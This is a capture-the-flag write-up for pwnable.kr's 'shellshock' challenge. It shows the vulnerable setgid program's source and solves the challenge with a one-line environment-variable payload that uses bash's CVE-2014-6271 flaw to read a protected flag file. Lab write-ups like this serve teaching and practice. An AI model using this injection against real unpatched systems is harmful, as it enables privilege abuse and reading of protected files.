![logo](http://www.pwnable.kr/img/shellshock.png)

# shellshock
The tenth challenge from pwnable.kr

## Description
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

## Solution

```sh
shellshock@ubuntu:~$ ls -la
total 980
drwxr-x---  5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 93 root root             4096 Oct 10 22:56 ..
-r-xr-xr-x  1 root shellshock     959120 Oct 12  2014 bash
d---------  2 root root             4096 Oct 12  2014 .bash_history
-r--r-----  1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x  2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x  2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--  1 root root              188 Oct 12  2014 shellshock.c
```

We'll need `shellshock` to open up `flag` for us. Seems we have a vulnerable `bash` program involved as well.

Let's open up `shellshock.c`

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

`echo` doesn't have an absolute path, so let's try modifying ENV variables.

```sh
shellshock@ubuntu:~$ export echo="() { cat /home/shellshock/flag; }"
```

### Capturing the Flag

```sh
shellshock@ubuntu:~$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
```
